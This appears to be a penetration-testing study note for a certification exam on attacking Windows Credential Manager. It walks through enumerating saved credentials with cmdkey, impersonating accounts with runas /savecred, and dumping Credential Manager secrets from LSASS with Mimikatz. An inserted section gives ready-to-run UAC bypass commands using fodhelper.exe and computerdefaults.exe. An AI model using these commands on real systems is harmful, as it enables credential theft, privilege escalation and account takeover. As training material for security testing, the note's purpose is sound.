# 🔐 1. Attacking Windows Credential Manager

> [!info]  
> **Windows Credential Manager** is a built-in Windows feature that securely stores credentials used to authenticate to websites, services, network resources, and other systems.
> 
> From a penetration-testing perspective, the important idea is:
> 
> **If credentials are stored by Windows, they may become a valuable source of credentials for privilege escalation, lateral movement, or account impersonation.**

---

# 🧠 2. Windows Vault & Credential Manager

Credential Manager has existed since **Windows Server 2008 R2** and **Windows 7**.

Windows stores credentials inside encrypted **Vault / Credential Locker** locations associated with user and system profiles.

### 📂 Important Storage Locations

```text
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

> [!important]  
> Microsoft increasingly uses the term **Credential Lockers** instead of **Windows Vaults**.
> 
> - **Credential Manager** → user-facing feature/API
>     
> - **Vault / Credential Locker** → underlying encrypted storage
>     

---

# 🔐 3. How Credential Storage Is Protected

Each vault folder contains a:

```text
Policy.vpol
```

The `Policy.vpol` file contains **AES encryption keys**.

Depending on the Windows version, these may be:

```text
AES-128
AES-256
```

The AES keys themselves are protected using **DPAPI**.

### 🔑 Protection Chain

```text
Stored Credential
      ↓
Encrypted with AES
      ↓
AES key stored in Policy.vpol
      ↓
AES key protected by DPAPI
      ↓
DPAPI master keys
      ↓
User/system protection mechanisms
```

Newer Windows versions may additionally use **Credential Guard**, which helps protect DPAPI master keys by storing sensitive material inside **secured memory enclaves** using virtualization-based security.

> [!warning]  
> Credential Manager data is **not simply stored as plaintext passwords on disk**. Extracting useful credentials may require recovering/decrypting the appropriate keys or accessing credential material from memory.

---

# 📊 4. Types of Credentials

Windows primarily stores two categories of credentials in Credential Manager:

|NameDescription||
|---|---|
|Web Credentials|Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.|
|Windows Credentials|Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories.|

### 🧠 Mental Model

```text
             Credential Manager
                    │
          ┌─────────┴─────────┐
          ↓                   ↓
   Web Credentials      Windows Credentials
          │                   │
   Websites / online      Services /
   accounts              domains /
                         networks /
                         shared resources
```

> [!tip]  
> During enumeration, **Windows Credentials** are especially interesting because they can contain credentials associated with **domain accounts, services, network resources, and shared directories**.

---

# 💾 5. Exporting Windows Vaults

Windows Vaults can be exported to `.crd` files through Control Panel or from the command line.

The command:

```cmd
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
```

opens the **Stored User Names and Passwords** interface.

### 🔎 Important

Vault backups created through this interface are:

- encrypted
    
- protected with a password supplied by the user
    
- capable of being imported on another Windows system
    

> [!info]  
> This interface can be useful during an assessment for identifying what credentials the current user has stored.

---

# 🔎 6. Enumerating Credentials with `cmdkey`

Windows provides the built-in **`cmdkey`** utility for managing and enumerating stored credentials.

### 📌 Enumerate Current User's Stored Credentials

```cmd
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

### 🧩 Command

```cmd
cmdkey /list
```

**Purpose:** Lists credentials stored in the current user's profile.

---

# 📊 7. Understanding `cmdkey` Output

Stored credentials are displayed using several important fields:

|KeyValue||
|---|---|
|Target|The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.|
|Type|The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.|
|User|The user account associated with the credential.|
|Persistence|Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots.|

### 🧠 What to Look For

```text
cmdkey /list
      ↓
Identify stored credentials
      ↓
Check Target
      ↓
Check Type
      ↓
Identify associated User
      ↓
Check Persistence
      ↓
Determine whether impersonation is possible
```

---

# 🧪 8. Interpreting the Example

The first credential is:

```text
Target: WindowsLive:target=virtualapp/didlogical
Type: Generic
User: 02hejubrtyqjrkfi
Local machine persistence
```

`virtualapp/didlogical` is a generic credential associated with Microsoft account / Windows Live services.

The random-looking username is an **internal account identifier**, so it can generally be ignored for the purposes of obtaining an interactive Windows account.

---

## 🎯 8.1 Interesting Domain Credential

The second entry is much more interesting:

```text
Target: Domain:interactive=SRV01\mcharles
Type: Domain Password
User: SRV01\mcharles
```

This represents a stored credential for:

```text
SRV01\mcharles
```

The important keyword is:

```text
interactive
```

This indicates that the stored credential can be associated with an **interactive logon session**.

---

# 🎭 9. Impersonating a Stored Credential with `runas`

If an appropriate stored credential exists, Windows' `runas` utility can be used with `/savecred` to launch a process using the saved credentials.

### 💻 Command

```cmd
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```

### 🔎 Syntax

```text
runas /savecred /user:<DOMAIN>\<USER> <PROGRAM>
```

For the example:

```text
runas
  │
  ├── /savecred
  │      ↓
  │   Use previously stored credentials
  │
  ├── /user:SRV01\mcharles
  │      ↓
  │   Target account
  │
  └── cmd
         ↓
      Launch Command Prompt
```

If successful, the resulting shell runs under the specified account.

### 🧠 Mental Model

```text
Stored Credential
       ↓
   cmdkey /list
       ↓
Find interesting account
       ↓
runas /savecred
       ↓
New process
       ↓
Runs as stored user
```

> [!important]  
> This is particularly valuable when the stored account has **more privileges or access than the current account**.

---

# 🧰 10. Extracting Credentials with Mimikatz

One of the tools commonly used to extract Windows credentials is **Mimikatz**.

Mimikatz provides multiple approaches for working with stored credential material.

Two particularly relevant modules are:

```text
sekurlsa
   ↓
Credential material from memory

dpapi
   ↓
Manually decrypt DPAPI-protected credentials
```

For this example, the target is **LSASS memory** using `sekurlsa`.

---
#   🚨Bypass UAC

> [!info]  
> **Goal:** Bypass **User Account Control (UAC)** to execute a command with elevated Administrator privileges.

### 🔓 Method 1 — `fodhelper.exe`

```cmd
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
```

**What happens:**

```text
HKCU registry modification
        ↓
ms-settings handler hijacked
        ↓
fodhelper.exe launched
        ↓
UAC bypass
        ↓
cmd.exe executes elevated
```

### 🔓 Method 2 — `computerdefaults.exe`

```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```

> [!important]  
> `fodhelper.exe` and `computerdefaults.exe` are legitimate Windows executables that can be abused through **per-user registry modifications** to bypass UAC.


```
# 🔓 11. Mimikatz `sekurlsa::credman`

Start Mimikatz:

```cmd
C:\Users\Administrator\Desktop> mimikatz.exe
```

Then enable the privileges required for credential extraction:

```text
mimikatz # privilege::debug
Privilege '20' OK
```

Next, use:

```text
mimikatz # sekurlsa::credman
```

### 📌 Example Output

```text
Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...
```

---

# 🧠 12. Understanding the Mimikatz Output

The output gives important context about the credential:

```text
Authentication Id
        ↓
Identifies the logon session

Session
        ↓
Shows the session type

User Name
        ↓
Windows account associated with session

Domain
        ↓
Windows domain / computer context

SID
        ↓
Security identifier of the account

credman
        ↓
Credential Manager material

Username
        ↓
Stored credential username

Domain
        ↓
Service/resource associated with credential

Password
        ↓
Recovered credential material
```

In the example:

```text
Windows User:
mcharles

Stored credential:
mcharles@inlanefreight.local

Credential domain/service:
onedrive.live.com
```

The password is redacted in the example with:

```text
...SNIP...
```

---

# 🧬 13. Relationship Between Credential Manager and LSASS

This is an important distinction from the previous **Attacking LSASS** section.

Credential Manager stores protected credentials on disk, but credential material can also become available through **LSASS memory** during active sessions.

Therefore, there are two broad approaches:

```text
                 Credential Manager
                        │
             ┌──────────┴──────────┐
             ↓                     ↓
        Disk / Vault            LSASS Memory
             │                     │
             ↓                     ↓
          DPAPI                  sekurlsa
             │                     │
             ↓                     ↓
       Decrypt/extract       Extract credman
```

### 🔑 Two Mimikatz Paths

|Method|Purpose|
|---|---|
|`sekurlsa`|Extract credential material from LSASS memory|
|`dpapi`|Work with DPAPI-protected credentials and secrets|

> [!important]  
> **Credential Manager ≠ LSASS.** Credential Manager is the Windows credential-storage mechanism, while LSASS is a process that can contain credential material in memory during active logon sessions.

---

# 🛠️ 14. Other Credential Extraction Tools

Other tools that may be used to enumerate or extract stored Windows credentials include:

### 🔹 SharpDPAPI

Useful for working with **DPAPI-protected secrets** from Windows environments.

### 🔹 LaZagne

A credential-recovery tool capable of extracting credentials from various applications and sources.

### 🔹 DonPAPI

A tool focused on remotely recovering Windows DPAPI secrets and related credential material.

```text
Credential Manager
       │
       ├── Mimikatz
       │     ├── sekurlsa
       │     └── dpapi
       │
       ├── SharpDPAPI
       │
       ├── LaZagne
       │
       └── DonPAPI
```

---

# ⚔️ 15. CPTS Attack Workflow

When you obtain access to a Windows system, Credential Manager should be part of your credential-enumeration process.

```text
🖥️ Initial Windows Access
        ↓
👤 Identify Current User
        ↓
🔎 Enumerate Credential Manager
        ↓
cmdkey /list
        ↓
📋 Identify Stored Credentials
        ↓
┌───────────────────────────────┐
│ Generic                       │
│ Domain Password               │
│ Interactive credentials       │
│ Persistent credentials        │
└───────────────────────────────┘
        ↓
🎯 Identify Interesting Account
        ↓
runas /savecred
        ↓
👤 Impersonate Stored Account
        │
        └──────────────┐
                       ↓
                🔓 Higher Access
```

For deeper extraction:

```text
Windows Access
      ↓
🧠 LSASS / Credential Material
      ↓
Mimikatz
      ↓
sekurlsa::credman
      ↓
🔐 Credential Manager Secrets
      ↓
Credential Reuse / Impersonation
      ↓
➡️ Privilege Escalation / Lateral Movement
```

---

# 🧠 16. Strong Mental Model

Think of Credential Manager as a **password safe** built into Windows.

```text
                    🔐 Windows Credential Manager
                              │
                 ┌────────────┴────────────┐
                 ↓                         ↓
          🌐 Web Credentials       🖥️ Windows Credentials
                 │                         │
          Websites / accounts       Domains / services /
                                    network resources
                                             │
                                             ↓
                                      🔒 Encrypted Storage
                                             │
                                             ↓
                                           DPAPI
                                             │
                                             ↓
                                      🔑 Protected Keys
                                             │
                         ┌───────────────────┴───────────────────┐
                         ↓                                       ↓
                    💾 Disk/Vault                          🧠 LSASS Memory
                         │                                       │
                      DPAPI                                sekurlsa
                         │                                       │
                         ↓                                       ↓
                 Decrypt / extract                     Extract credman
```

The pentester's objective is **not necessarily to attack the encryption directly**. Instead, look for places where Windows has already made the credentials accessible to the logged-in user or exposed the relevant credential material in memory.

---

# ⚡ 17. CPTS Cheat Sheet

|Goal|Tool / Command|What to Remember|
|---|---|---|
|Identify current user|`whoami`|Establish current context|
|Enumerate stored credentials|`cmdkey /list`|Look for interesting users/resources|
|Launch process using saved credentials|`runas /savecred /user:<DOMAIN>\<USER> <PROGRAM>`|Can impersonate a stored account|
|Open Stored User Names and Passwords|`rundll32 keymgr.dll,KRShowKeyMgr`|GUI management of stored credentials|
|Enable Mimikatz debug privilege|`privilege::debug`|Required for many credential operations|
|Extract Credential Manager data from LSASS|`sekurlsa::credman`|Targets credential material in memory|
|Work with DPAPI secrets|`dpapi`|Decrypt/extract DPAPI-protected material|
|Alternative DPAPI tool|`SharpDPAPI`|Windows DPAPI analysis|
|Alternative credential tool|`LaZagne`|Credential recovery from multiple sources|
|Remote DPAPI credential extraction|`DonPAPI`|DPAPI-focused credential extraction|

---

# ⚠️ 18. Important CPTS Distinctions

> [!warning]  
> Do not confuse these concepts:

### Credential Manager

```text
Windows feature
        ↓
Stores credentials
        ↓
Vault / Credential Locker
```

### DPAPI

```text
Windows protection mechanism
        ↓
Protects encryption keys / secrets
```

### LSASS

```text
Windows security process
        ↓
Handles authentication
        ↓
May contain credential material in memory
```

### Mimikatz

```text
Credential extraction tool
        ↓
sekurlsa → LSASS memory
dpapi    → DPAPI-protected secrets
credman  → Credential Manager material
```

---

# 🎯 19. Key Takeaways

> [!success]  
> **1. Credential Manager stores credentials used by Windows, applications, websites, services, and network resources.**

> [!success]  
> **2. `cmdkey /list` is the first command to remember for enumerating stored credentials.**

> [!success]  
> **3. `Domain:interactive=<user>` credentials are especially interesting because `runas /savecred` may allow impersonation of the stored account.**

> [!success]  
> **4. Credential Manager data is protected using encryption and DPAPI rather than being stored as simple plaintext files.**

> [!success]  
> **5. Mimikatz can extract Credential Manager material from LSASS with `sekurlsa::credman`.**

> [!success]  
> **6. `dpapi` provides another path for working with DPAPI-protected credential material.**

> [!success]  
> **7. Always distinguish between the storage mechanism (Credential Manager), protection mechanism (DPAPI), memory location (LSASS), and extraction tool (Mimikatz).**

### 🧠 One-Line Exam Memory

```text
cmdkey /list
    ↓
Find stored credential
    ↓
Domain:interactive
    ↓
runas /savecred
    ↓
Impersonate user

OR

LSASS memory
    ↓
mimikatz
    ↓
sekurlsa::credman
    ↓
Extract Credential Manager material
```